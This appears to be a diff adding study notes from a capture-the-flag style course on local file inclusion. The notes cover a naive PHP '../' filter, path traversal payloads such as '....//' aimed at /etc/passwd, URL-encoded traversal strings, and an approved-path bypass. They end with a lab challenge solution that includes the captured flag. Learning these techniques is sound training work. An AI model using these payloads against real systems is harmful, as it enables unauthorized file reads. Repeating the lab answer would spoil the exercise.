@@ -1,1 +1,35 @@
+Basic Bypasses
+In the previous section, we saw several types of attacks that we can use for different types of LFI vulnerabilities. In many cases, we may be facing a web application that applies various protections against file inclusion, so our normal LFI payloads would not work. Still, unless the web application is properly secured against malicious LFI user input, we may be able to bypass the protections in place and reach file inclusion.
+
+
+Non-Recursive Path Traversal Filters
+One of the most basic filters against LFI is a search and replace filter, where it simply deletes substrings of (../) to avoid path traversals. For example:
+
+EXAMPLE: $language = str_replace('../', '', $_GET['language']);
+
+The above code is supposed to prevent path traversal, and hence renders LFI useless. If we try the LFI payloads we tried in the previous section, we get an error
+
+ For example, if we use ....// as our payload, then the filter would remove ../ and the output string would be ../, which means we may still perform path traversal. Let's try applying this logic to include /etc/passwd again:
+
+EXAMPLE: http://<SERVER_IP>:<PORT>/index.php?language=....//....//....//....//etc/passwd -> get wrekt n bypassed
+
+As we can see, the inclusion was successful this time, and we're able to read /etc/passwd successfully. The ....// substring is not the only bypass we can use, as we may use ..././ or ....\/ and several other recursive LFI payloads. Furthermore, in some cases, escaping the forward slash character may also work to avoid path traversal filters (e.g. ....\/), or adding extra forward slashes (e.g. ....////)
+
+If the target web application did not allow . and / in our input, we can URL encode ../ into %2e%2e%2f, which may bypass the filter. To do so, we can use any online URL encoder utility or use the Burp Suite Decoder tool, as follows:
+
+URL EXAMPLE AFTER ENCODING: <SERVER_IP>:<PORT>/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64 
+
+Approved Paths
+Some web applications may also use Regular Expressions to ensure that the file being included is under a specific path. For example, the web application we have been dealing with may only accept paths that are under the ./languages directory, as follows:
+
+URL EXAMPLE: <SERVER_IP>:<PORT>/index.php?language=./languages/../../../../etc/passwd
+
+
+
+CHALLENGE: 83.136.249.46:43773
+
+Question 1 - The above web application employs more than one filter to avoid LFI exploitation. Try to bypass these filters to read /flag.txt 
+1) http://83.136.249.46:43773
+2) lets try out the first example of doulbe ../ so ....// index.php?language=languages/....//....//....//....//....//flag.txt
+Output: HTB{64$!c_f!lt3r$_w0nt_$t0p_lf!}
 
